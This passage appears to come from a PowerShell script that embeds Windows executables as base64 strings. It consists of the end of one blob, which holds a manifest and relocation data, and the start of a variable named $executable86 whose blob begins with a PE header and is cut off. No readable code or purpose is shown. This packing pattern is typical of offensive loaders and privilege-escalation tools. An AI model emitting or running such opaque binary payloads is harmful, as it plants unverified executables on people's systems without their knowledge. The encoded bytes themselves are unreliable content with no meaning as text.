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ihmKGoobihyKHYoeih+KEIohiiKKI4okiiWKJooniiiKKYoqiiuKLIotii6KL4ogijGKMoozijSKNYo2ijeKOIo5ijqKO4o8ij2KPoo/ijCKQYpCikOKRIpFikaKR4pIikmKSopLikyKTYpOik+KQIpRilKKU4pUilWKVopXiliKWYpailuKXIpdil6KX4pQimGKYopjimSKZYpmimeKaIppimqKa4psim2KbopvimCKcYpyinOKdIp1inaKd4p4inmKeop7inyKfYp+in+KcIqBioKKg4qEioWKhoqHioiKiYqKiouKjIqNio6Kj4qAipGKkoqTipSKlYqWipeKmIqZipqKm4qcip2KnoqfipCKoYqiiqOKpIqliqaKp4qoiqmKqoqriqyKrYquiq+KoIqxirKKs4q0irWKtoq3iriKuYq6iruKvIq9ir6Kv4qwisGKworDisAKABAPwAAABgqHCogKiQqKCosKjAqNCo4KjwqACpEKkgqTCpQKlQqWCpcKmAqZCpoKmwqcCp0KngqfCpAKoQqiCqMKpAqlCqYKpwqoCqkKqgqrCqwKrQquCq8KoAqxCrIKswq0CrUKtgq3CrgKuQq6CrsKvAq9Cr4KvwqwCsEKwgrDCsQKxQrGCscKyArJCsoKywrMCs0KzgrPCsAK0QrSCtMK1ArVCtYK1wrYCtkK2grbCtwK3QreCt8K0ArhCuIK4wrkCuUK5grnCugK6QrqCusK7ArtCu4K7wrgCvEK8grzCvQK9Qr2CvcK+Ar5CvoK+wr8Cv0K/gr/CvALABANwAAAAAoBCgIKAwoECgUKBgoHCggKCQoKCgsKDAoNCg4KDwoAChEKEgoTChQKFQoWChcKGAoZChoKGwocCh0KHgofChAKIQoiCiMKJAolCiYKJwooCikKKgorCiwKLQouCi8KIAoxCjIKMwo0CjUKNgo3CjgKOQo6CjsKPAo9Cj4KPwowCkEKQgpDCkQKRQpGCkcKSApJCkoKSwpMCk0KTgpPCkAKUQpSClMKVApVClYKVwpYClkKWgpbClwKXQpeCl8KUAphCmIKYwpkCmUKZgpnCmgKaQpgDgAQAYAAAAsKW4pRiuMK44rtiu4K7orgAgAgBMAAAAsKH4oRiiOKJYoniiqKLAosii0KIIoxCjYKhwqHiogKiIqJComKigqKiosKi4qMio0KjYqOCo6KjwqPioAKlAqmiqkKoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="

$executable86 = "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